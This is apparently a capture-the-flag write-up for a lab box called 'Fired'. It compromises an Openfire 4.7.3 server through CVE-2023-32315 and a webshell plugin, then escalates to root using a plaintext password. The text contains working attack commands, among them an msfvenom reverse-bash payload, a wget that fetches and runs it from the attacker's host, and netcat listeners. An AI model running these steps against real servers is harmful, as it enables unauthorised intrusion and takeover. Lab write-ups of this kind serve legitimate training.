# CTF Writeup: Fired

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.129.96
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-30 02:04 -0500
Nmap scan report for 192.168.129.96
Host is up (0.028s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE                VERSION
22/tcp   open  ssh                    OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 51:56:a7:34:16:8e:3d:47:17:c8:96:d5:e6:94:46:46 (RSA)
|   256 fe:76:e3:4c:2b:f6:f5:21:a2:4d:9f:59:52:39:b9:16 (ECDSA)
|_  256 2c:dd:62:7d:d6:1c:f4:fd:a1:e4:c8:aa:11:ae:d6:1f (ED25519)
9090/tcp open  hadoop-tasktracker     Apache Hadoop
|_http-title: Site doesn't have a title (text/html).
| hadoop-tasktracker-info: 
|_  Logs: jive-ibtn jive-btn-gradient
| hadoop-datanode-info: 
|_  Logs: jive-ibtn jive-btn-gradient
9091/tcp open  ssl/hadoop-tasktracker Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: jive-ibtn jive-btn-gradient
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost, DNS:*.localhost
| Not valid before: 2024-06-28T07:02:39
|_Not valid after:  2029-06-27T07:02:39
|_ssl-date: TLS randomness does not represent time
| hadoop-tasktracker-info: 
|_  Logs: jive-ibtn jive-btn-gradient
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   27.85 ms 192.168.45.1
2   27.81 ms 192.168.45.254
3   28.01 ms 192.168.251.1
4   28.01 ms 192.168.129.96

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.95 seconds
```

Upon inspecting the webpage running on port 9090, we are getting greeted with an login panel to an "Administration Console". The Web Application in place, seems to be "Openfire 4.7.3"

## Vulnerability Assessment

Let's search up CVE's for it!

I searched up on google and downloaded the following PoC:

```
git clone https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT.git
Cloning into 'CVE-2023-32315-EXPLOIT'...
remote: Enumerating objects: 41, done.
remote: Counting objects: 100% (41/41), done.
remote: Compressing objects: 100% (39/39), done.
remote: Total 41 (delta 16), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (41/41), 280.99 KiB | 3.90 MiB/s, done.
Resolving deltas: 100% (16/16), done.
```

Executed the exploit and successfully created an new admin user.

```
python3 CVE-2023-32315.py -u http://192.168.129.96:9090

 ██████ ██    ██ ███████       ██████   ██████  ██████  ██████        ██████  ██████  ██████   ██ ███████
██      ██    ██ ██                 ██ ██  ████      ██      ██            ██      ██      ██ ███ ██     
██      ██    ██ █████   █████  █████  ██ ██ ██  █████   █████  █████  █████   █████   █████   ██ ███████
██       ██  ██  ██            ██      ████  ██ ██           ██            ██ ██           ██  ██      ██
 ██████   ████   ███████       ███████  ██████  ███████ ██████        ██████  ███████ ██████   ██ ███████

Coded By: K3ysTr0K3R --> Hug me ʕっ•ᴥ•ʔっ

[*] Launching exploit against: http://192.168.129.96:9090
[*] Checking if the target is vulnerable
[+] Target is vulnerable
[*] Adding credentials
[+] Successfully added, here are the credentials
[+] Username: hugme
[+] Password: HugmeNOW
```

Logged into the CMS with hugme:HugmeNOW

After further analysis, there seems to be an upload functionality in place under Plugins.
Which allows us to upload .jar files.

But this didn't workout, let's search for more exploits for "Openfire 4.7.3"

Utilized the following PoC and used the .jar file from there, which acts an webshell.

```
git clone https://github.com/miko550/CVE-2023-32315.git           
Cloning into 'CVE-2023-32315'...
remote: Enumerating objects: 31, done.
remote: Counting objects: 100% (31/31), done.
remote: Compressing objects: 100% (29/29), done.
remote: Total 31 (delta 15), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (31/31), 38.13 KiB | 1.59 MiB/s, done.
Resolving deltas: 100% (15/15), done.
```

Let's upload the webshell .jar file!

I successfully uploaded the .jar file plugin, the next step hinted from the github repo.

Move to Server > Server Settings > Management Tool > Access Webshell with password "123", which was also being displayed on the CMS.

Go to the dropdown and select "System Command". there is an webshell included which provides command execution.

Let's utilize this functionality to gain RCE.

Start up listener on port 9090.

```
nc -lvnp 9090
```

A lot of reverse shell scripts didn't work, but the following worked:

1. Created the reverse shell utilizing "msfvenom".

```
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.219 LPORT=9090 -f raw > reverse.sh
```

2. Downloaded the .sh script into the /tmp directory to the target server.

```
wget http://192.168.45.219/reverse.sh -O /tmp/reverse.sh
```

3. Gave it executable permissions.

```
chmod +x /tmp/reverse.sh
```

4. Started up my listener on port 9090.

```
nc -lvnp 9090
```

5. Executed the .sh script.

```
/bin/bash /tmp/reverse.sh
```

Gained RCE as user "openfire".

```
nc -lvnp 9090
listening on [any] 9090 ...
connect to [192.168.45.219] from (UNKNOWN) [192.168.129.96] 54184
```

Retrieved local.txt in /home/openfire directory.

```
2576bb576a7455f16d586f3a4dd13510
```

## Privilege Escalation

Performed Shell Hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

Enumerated Binaries with the SUID set, but nothing interesting.

```
openfire@openfire:/$ find / -perm /4000 2>/dev/null
/usr/bin/at
/usr/bin/mount
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/umount
/usr/bin/su
/usr/bin/fusermount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/snap/snapd/21759/usr/lib/snapd/snap-confine
/snap/core18/1880/bin/mount
/snap/core18/1880/bin/ping
/snap/core18/1880/bin/su
/snap/core18/1880/bin/umount
/snap/core18/1880/usr/bin/chfn
/snap/core18/1880/usr/bin/chsh
/snap/core18/1880/usr/bin/gpasswd
/snap/core18/1880/usr/bin/newgrp
/snap/core18/1880/usr/bin/passwd
/snap/core18/1880/usr/bin/sudo
/snap/core18/1880/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1880/usr/lib/openssh/ssh-keysign
/snap/core18/2829/bin/mount
/snap/core18/2829/bin/ping
/snap/core18/2829/bin/su
/snap/core18/2829/bin/umount
/snap/core18/2829/usr/bin/chfn
/snap/core18/2829/usr/bin/chsh
/snap/core18/2829/usr/bin/gpasswd
/snap/core18/2829/usr/bin/newgrp
/snap/core18/2829/usr/bin/passwd
/snap/core18/2829/usr/bin/sudo
/snap/core18/2829/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2829/usr/lib/openssh/ssh-keysign
/snap/core20/2318/usr/bin/chfn
/snap/core20/2318/usr/bin/chsh
/snap/core20/2318/usr/bin/gpasswd
/snap/core20/2318/usr/bin/mount
/snap/core20/2318/usr/bin/newgrp
/snap/core20/2318/usr/bin/passwd
/snap/core20/2318/usr/bin/su
/snap/core20/2318/usr/bin/sudo
/snap/core20/2318/usr/bin/umount
/snap/core20/2318/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2318/usr/lib/openssh/ssh-keysign
```

Retrieved an interesting password: Secr3t$tr1ng! in /etc/openfire/security.xml

Ater searching for all openfire directories, I found an interesting directory inside /var/lib/openfire.

```
openfire@openfire:/usr/share/openfire/embedded-db$ find / -type d -iname "openfire" 2>/dev/null
/usr/share/openfire
/usr/share/doc/openfire
/var/log/openfire
/var/lib/openfire
/home/openfire
/etc/openfire
```

There seemed to be an database file .log file symlinked to another file. Let's view it!


```
openfire@openfire:/usr/share/openfire$ ls -la
total 24
drwxr-x---   4 openfire openfire  4096 Jun 28  2024 .
drwxr-xr-x 124 root     root      4096 Jun 28  2024 ..
lrwxrwxrwx   1 openfire openfire    13 Aug  2  2022 conf -> /etc/openfire
lrwxrwxrwx   1 openfire openfire    29 Aug  2  2022 embedded-db -> /var/lib/openfire/embedded-db
drwxr-x---   2 openfire openfire 12288 Jun 28  2024 lib
lrwxrwxrwx   1 openfire openfire    17 Aug  2  2022 logs -> /var/log/openfire
lrwxrwxrwx   1 openfire openfire    25 Aug  2  2022 plugins -> /var/lib/openfire/plugins
drwxr-x---   3 openfire openfire  4096 Jun 28  2024 resources
```

Upon inspecting it I found an plaintext smtp "root" password. "OpenFireAtEveryone"

Logged into user "root".

```
openfire@openfire:/usr/share/openfire/embedded-db$ su root
Password: 
root@openfire:/usr/share/openfire/embedded-db#
```

Retrieved proof.txt in /root directory.

```
495d801e0687d8a4a927272cf51de72d
```
